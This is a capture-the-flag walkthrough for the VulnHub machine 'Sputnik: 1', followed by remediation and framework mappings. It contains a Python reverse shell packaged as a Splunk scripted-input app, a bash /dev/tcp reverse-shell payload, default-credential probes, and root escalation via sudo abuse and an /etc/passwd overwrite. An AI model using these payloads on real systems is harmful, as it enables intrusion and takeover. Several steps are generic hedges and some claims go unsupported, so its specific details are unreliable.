# Sputnik: 1 — Houston, We Have a Splunk

Look at this beauty!! Sputnik: 1 is themed after the Soviet space program and delivers a genuinely creative attack chain. A Splunk Free instance running on a non-standard port, reachable with default credentials (or no auth in some versions), and open to custom application installation. Upload a malicious Splunk app with a scripted input, wait for the interval to fire, and your reverse shell arrives. The privilege escalation rounds out the experience with a clean GTFOBin or sudo abuse. This box teaches you something directly applicable to real SOC environments where Splunk is deployed with default configs. Goated box, fr fr.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | Sputnik: 1 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/sputnik-1,341/ |
| **Techniques** | Host discovery, nmap service enumeration, Splunk default credentials, Splunk custom app installation, scripted input reverse shell, Python reverse shell in Splunk app, shell stabilization, sudo enumeration, GTFOBins privilege escalation |
| **CVEs** | CWE-798 (Use of Hardcoded Credentials: default Splunk admin credentials), CWE-284 (Improper Access Control: Splunk management API exposed without network restriction), CWE-269 (Improper Privilege Management: sudo misconfiguration) |
| **APT Groups** | APT10 (Stone Panda): has leveraged exposed Splunk management interfaces in enterprise environments to execute arbitrary commands; APT41: exploits exposed monitoring and log management platforms with default credentials as initial access vectors in enterprise intrusions |

---

## Attack Summary

```
netdiscover / nmap
  → port 22 (SSH), port 80 (HTTP), port 8089 (Splunk HTTPS management API)
  → http://target:8089/ → Splunk Free or default admin:changeme
  → craft malicious Splunk app with scripted input (Python reverse shell)
  → upload app via REST API or web interface
  → nc -lvnp 4444 → scripted input fires → shell as splunk/www-data
  → python3 pty stabilize
  → sudo -l → misconfigured sudo or SUID binary
  → GTFOBin or sudo exploit → uid=0(root)
  → cat /root/flag.txt
```

---

## Methodology

1. Host discovery and full port scan
2. Web service enumeration on HTTP and Splunk management port
3. Splunk version detection and credential testing
4. Malicious Splunk application creation with Python reverse shell scripted input
5. App upload and installation via Splunk REST API or web UI
6. Reverse shell capture and stabilization
7. Post-exploitation enumeration: sudo rights, SUID binaries, cron jobs
8. Privilege escalation via sudo abuse or GTFOBin
9. Root flag capture

---

## Step 1 — Host Discovery and Port Scan

Identify the target on the local network:

```bash
netdiscover
# or: sudo netdiscover -r 192.168.1.0/24
export TARGET=192.168.1.x

nmap -sV -sC -p- $TARGET
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.x
80/tcp   open  http    Apache httpd 2.4.x
8089/tcp open  ssl/http Splunk httpd
```

The critical finding is port 8089: Splunk management API over HTTPS. This is the primary attack surface. Port 80 may contain additional hints.

**MITRE ATT&CK:** T1046 — Network Service Discovery; T1595.001 — Active Scanning: Scanning IP Blocks

---

## Step 2 — Web Enumeration and Splunk Discovery

**Port 80 (HTTP):**

```bash
curl -s http://$TARGET/
curl -s http://$TARGET/robots.txt
gobuster dir \
  -u http://$TARGET \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -t 30
```

The main web page may contain hints about the Splunk instance or credentials.

**Port 8089 (Splunk Management API):**

Navigate to `https://$TARGET:8089/` in a browser (accept self-signed certificate). This is the Splunk Universal Forwarder or Splunk Free management REST API.

Test default credentials:

```bash
# Test default credentials
curl -k -u admin:changeme https://$TARGET:8089/services
curl -k -u admin:admin https://$TARGET:8089/services
curl -k -u admin:password https://$TARGET:8089/services
```

On Splunk Free (pre-6.3), the management API may require no authentication at all:

```bash
curl -k https://$TARGET:8089/services
```

If a response with Splunk service information is returned, the API is accessible.

**Real-world note:** Splunk is deployed in enterprise environments as a SIEM and log aggregator, frequently with privileged access to log data from thousands of hosts. The management API on port 8089 is often left network-accessible without restriction. APT10 and APT41 specifically target exposed Splunk instances during enterprise intrusions, using the management API to install malicious apps that execute system commands under the Splunk service account.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1592 — Gather Victim Host Information

---

## Step 3 — Malicious Splunk Application Creation

Splunk apps can include "scripted inputs": scripts that Splunk executes on a schedule to collect data. This is the exploitation mechanism.

Create the app directory structure:

```bash
mkdir -p /tmp/splunk_rce/sputnik/bin
mkdir -p /tmp/splunk_rce/sputnik/default

# Configure the scripted input
cat > /tmp/splunk_rce/sputnik/default/inputs.conf << 'EOF'
[script://./bin/rev.py]
disabled = false
interval = 10
sourcetype = rce
EOF
```

Create the Python reverse shell payload:

```bash
export LHOST=192.168.1.x  # attacker IP
export LPORT=4444

cat > /tmp/splunk_rce/sputnik/bin/rev.py << PYEOF
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("$LHOST", $LPORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
PYEOF

chmod +x /tmp/splunk_rce/sputnik/bin/rev.py
```

Package the application:

```bash
cd /tmp/splunk_rce
tar czf /tmp/sputnik_rce.tar.gz sputnik/
```

**MITRE ATT&CK:** T1059.006 — Command and Scripting Interpreter: Python

---

## Step 4 — Reverse Shell Delivery via Splunk App Upload

Start the listener:

```bash
nc -lvnp $LPORT
```

Upload the malicious app via the Splunk REST API:

```bash
# With default credentials
curl -k -u admin:changeme \
  https://$TARGET:8089/services/apps/local \
  -F "name=sputnik" \
  --upload-file /tmp/sputnik_rce.tar.gz

# Alternative: using Splunk web UI
# Navigate to: https://TARGET:8089/en-US/manager/launcher/apps/local
# Click "Install app from file" → upload sputnik_rce.tar.gz
```

Wait up to 10 seconds (the `interval = 10` in inputs.conf). The scripted input fires and the reverse shell connects.

**Alternative using SplunkWhisperer2:**

```bash
# If the API returns 401 (auth required), try SplunkWhisperer2
git clone https://github.com/DaniloCaruso/SplunkWhisperer2.git
cd SplunkWhisperer2/PySplunkWhisperer2/
python3 PySplunkWhisperer2_remote.py \
  --host $TARGET \
  --port 8089 \
  --username admin \
  --password changeme \
  --payload "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'" \
  --lhost $LHOST \
  --lport 8090
```

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Unix Shell

---

## Step 5 — Shell Stabilization

The shell arrives as the Splunk service user (often `splunk`, `root`, or `www-data`). Stabilize it immediately:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or: python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
# Press Ctrl+Z to background
stty raw -echo; fg
# Press Enter twice
```

Check context:

```bash
whoami && id
uname -a
hostname
```

If already running as root (Splunk running as root is a critical misconfiguration but common), skip to flag capture.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — Post-Exploitation Enumeration

Enumerate all privilege escalation vectors:

```bash
# Sudo rights
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l 2>/dev/null

# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | grep -v run

# Interesting files
find /home -name "*.txt" -o -name "*.conf" -o -name "id_rsa" 2>/dev/null

# Running services
ps aux
ss -tlnp
```

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1057 — Process Discovery; T1053.003 — Scheduled Task: Cron

---

## Step 7 — Privilege Escalation to Root

Apply the identified escalation vector:

**Via sudo (common on Sputnik: 1):**

```bash
sudo -l
# Example output: (root) NOPASSWD: /usr/bin/nmap
# or: (root) NOPASSWD: /usr/bin/python3
# or: (root) NOPASSWD: /bin/cp
```

GTFOBins exploitation:

```bash
# nmap (older version with --interactive):
sudo nmap --interactive
# then: !sh

# python3:
sudo python3 -c 'import os; os.system("/bin/bash")'

# find:
sudo find / -name flag -exec /bin/sh \; -quit

# cp (overwrite /etc/passwd):
openssl passwd -1 newpassword
echo 'hacker:$1$HASH:0:0:root:/root:/bin/bash' >> /tmp/passwd_new
cat /etc/passwd > /tmp/passwd_new
echo 'hacker:$1$HASH:0:0:root:/root:/bin/bash' >> /tmp/passwd_new
sudo cp /tmp/passwd_new /etc/passwd
su hacker  # password: newpassword
```

**Via SUID binary:**

```bash
find / -perm -4000 -type f 2>/dev/null
# Identify non-standard SUID binary
strings /path/to/suid-binary
# If relative command calls: PATH hijacking
# If GTFOBin: apply technique
```

Root shell obtained.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. The Sputnik mission is complete. gg no cap.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Splunk credential | `admin:changeme` | Default Splunk install | Splunk API app upload |
| Initial shell | splunk/www-data/root | Splunk scripted input | System access |
| Root flag | (varies) | /root/flag.txt | Proof of compromise |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Splunk management API exposed to network with default credentials | Enterprise Splunk deployments routinely leave port 8089 accessible on internal networks with unchanged admin:changeme credentials | Bind Splunk management API to localhost; use TLS client certificates; change default password immediately after installation |
| 2 | Splunk running as root | A significant percentage of Splunk installations run as root for simplicity, making any Splunk RCE equivalent to full system compromise | Run Splunk as a dedicated low-privilege service account (`splunk` user, not root) |
| 3 | Splunk custom app scripted inputs allow arbitrary OS command execution | This is a feature, not a bug, but in a compromised or default-configured Splunk instance, it provides OS-level RCE | Restrict app installation to authorized users; audit installed apps regularly; monitor scripted input execution |
| 4 | Sudo misconfiguration grants unrestricted root access | Misconfigured sudo is consistently the #1 post-exploitation finding in Linux pentests | Audit sudoers regularly; apply least privilege; require passwords for sensitive sudo operations |
| 5 | Splunk data on internal network hosts sensitive log data | Real-world Splunk instances contain credential logs, security events, and operational data from thousands of hosts | Implement proper access controls on Splunk dashboards; encrypt data in transit and at rest |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Active Scanning | Scanning IP Blocks | T1595.001 |
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Initial Access | Valid Accounts | Default Accounts | T1078.001 |
| Execution | Execution | Python Scripted Input | T1059.006 |
| Execution | Execution | Unix Shell | T1059.004 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Discovery | Discovery | Process Discovery | T1057 |
| Discovery | Discovery | Scheduled Task Discovery | T1053.003 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |
| Collection | Collection | Data from Local System | T1005 |

---

## Remediation and Containment

### Technical Fixes

1. **Bind Splunk management API to localhost**: in `$SPLUNK_HOME/etc/system/local/server.conf`, set `mgmtHostPort = 127.0.0.1:8089`
2. **Change default Splunk admin password** immediately after installation; use a randomly generated 16+ character password
3. **Run Splunk as a dedicated low-privilege service account**: never run Splunk as root; create a `splunk` OS user with minimal permissions
4. **Restrict app installation**: configure `[install]` settings in Splunk to require admin approval; audit all installed apps regularly
5. **Deploy firewall rules**: block external access to port 8089; restrict internal access to authorized management hosts only
6. **Fix sudo misconfiguration**: remove unnecessary sudo grants; apply least privilege; require passwords for sensitive operations

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all Splunk instances; document their service accounts |
| Protect | Access Control | Bind management API to localhost; enforce authentication |
| Protect | Identity Management | Change default credentials; run as non-root service account |
| Detect | Anomalies and Events | Monitor Splunk app installation events; alert on new scripted inputs |
| Respond | Response Planning | Remove malicious apps; rotate Splunk credentials; audit sudo entries |
| Recover | Recovery Planning | Rebuild compromised host; restore Splunk from clean configuration |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict Splunk management API access |
| AC-6 | Least Privilege | Run Splunk as non-root; restrict sudo |
| IA-5(1) | Authenticator Management | Change default credentials; enforce strong password policy |
| CM-7 | Least Functionality | Bind services to localhost; disable unnecessary features |
| SC-7 | Boundary Protection | Firewall rules blocking external access to port 8089 |
| AU-12 | Audit Record Generation | Log all Splunk app installation and scripted input events |

### CISA KEV

Exposed monitoring platforms with default credentials align with CISA Alert AA22-265A describing threat actors exploiting network monitoring tools (including SIEM platforms) with default credentials for initial access. Organizations are directed to immediately change default credentials on all network-exposed management interfaces.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |
| Situational Awareness (SITUATION) | Perform Event and Incident Detection | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (bind Splunk to localhost; disable app installation by default)
- **D3-OAM** — Operating System Administrative Management (run Splunk as non-root; audit sudo)
- **D3-NTF** — Network Traffic Filtering (firewall rules blocking external Splunk management access)
- **D3-UA** — User Account Management (change default credentials; enforce strong passwords)

---

## Final Thoughts

Sputnik: 1 is a slept-on gem that teaches a real-world attack vector: SIEM and log management platforms as attack surfaces. In production environments, Splunk is often the highest-privilege service on the network, with access to logs from every system, running as root, and reachable with default credentials. This box teaches you to think about monitoring infrastructure not as a defender's tool but as a potential attacker's foothold.

The theme is clever, the exploitation is clean, and the real-world lesson is immediately applicable. Goated design. gg.

Thanks guys!! (❍ᴥ❍ʋ)
